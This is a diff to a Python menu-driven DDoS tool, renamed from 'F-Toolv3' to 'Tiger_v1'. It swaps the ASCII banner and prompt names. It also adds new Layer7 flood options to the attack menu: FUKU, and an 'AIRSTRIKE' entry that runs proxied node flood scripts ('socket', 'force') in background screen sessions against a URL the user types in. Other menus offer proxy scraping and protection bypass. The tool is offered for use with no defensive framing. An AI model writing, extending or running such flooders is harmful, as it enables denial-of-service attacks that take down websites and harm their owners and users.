@@ -66,14 +66,21 @@ class Home:
 				time.sleep(1)
 
 	def home(self): # don't edit this banner lol
-		print(f"""
-{Color.LR}.------..------..------..------..------.{Color.LR}
-{Color.LR}|T.--.m||I.--.m||G.--.m||E.--.m||R.--.m|{Color.LR}    {Color.LG}╔══════════════════════╗{Color.LG}
-{Color.LR}|m:/\:m||m(\/)m||m:/\:m||m(\/)m||m:():m|{Color.LR}    {Color.LG}║Crate : 1/1/2015{Color.LG}
-{Color.LR}|m(__)m||m:\/:m||m:\/:m||m:\/:m||m()()m|{Color.LR}    {Color.LG}║Update : 1/1/2024{Color.LG}
-{Color.LR}|m'--'T||m'--'I||m'--'G||m'--'E||m'--'R|{Color.LR}    {Color.LG}║Fuck DPR!!{Color.LG}
-{Color.LR}`------'`------'`------'`------'`------' v1{Color.LR} {Color.LG}╚══════════════════════╝{Color.LG}
-    {Color.LR}[{Color.LG}>     By TaliGanda Or Lex/LostC2    {Color.LG}<{Color.LR}]""")
+		print(f"""{Color.LF}
+      ⣀          
+     ⢾⠱⢕⠠⢀⡀                      Created > 01/01/2015
+     ⠈⢆⢸⢣⠁⠛⡄                     Update > 01/01/2024
+     ⢠⢏⠨⢪⢫⣷⡻⢆    
+    ⣰⣯⢖⠆⠁ ⣸⡈⠉    
+    ⡾⣇⡔⡳ ⢠⢻⢳⣄⡀   
+     ⣿⡇⣯⣶⢄ ⢢⡻⣦⡀  
+     ⠘⢿⠼⢸⣋  ⡍⠻⣿⣦ 
+      ⠆⡇⢸⡠⣐⠥⡝⠶⠛⢿⠧
+    ⢀⣠⣼⣧⣼⣷⣁⣒⣡⡴ ⢸⡆
+   ⣪⠿⠗⠂ ⠔⠊⠉⠉⠉⠉⢉⢢⠇            {Color.LW}Tiger_v1{Color.LF}
+ ⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕⣲⣶⣶⠾⠋ 
+⠊ ⠈              
+""")
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
 		print(Color.LR+"["+Color.LW+"01"+Color.LR+"]"+Color.LC+" Proxy")
 		print(Color.LR+"["+Color.LW+"02"+Color.LR+"]"+Color.LC+" WebTool")
@@ -82,7 +89,7 @@ class Home:
 		print("\n")
 		while True:
 			try:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv3"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Tiger_v1"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					os.system('clear')
@@ -282,7 +289,7 @@ class Tool:
 		print(Color.LR+"["+Color.LW+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
 		print("\n")
 		while True:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv3"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Tiger_v1"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					with open("http.txt", 'w') as p:
@@ -341,7 +348,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv3"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Tiger_v1"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				while True:
@@ -469,7 +476,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv3"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Tiger_v1"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				os.system('clear');self.l4()
@@ -576,7 +583,7 @@ class Tool:
 """)
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HUM4N 3RR0R: FUCK YOU (Sonic Network)")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" VOID: Bypass + Attack Protect Custom (IHP)")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" AIRSTRIKE: C0M1NG S00N.... (LostC2)")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" AIRSTRIKE: Attack For Website Fastly + Fastly Permanen (LostC2)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -605,11 +612,21 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/proxy.txt 512'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/proxy.txt'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/proxy1.txt'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 15 utils/proxy.txt'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-					
+			if option in ['03', '3']:
+				try:
+					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/proxy1.txt {floodtime} {reqs}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/force GET 15 {url} utils/proxy.txt {floodtime} 512'], shell=True)
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+				except:
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
 				self.l7()
 			elif option in ['home', 'HOME']:
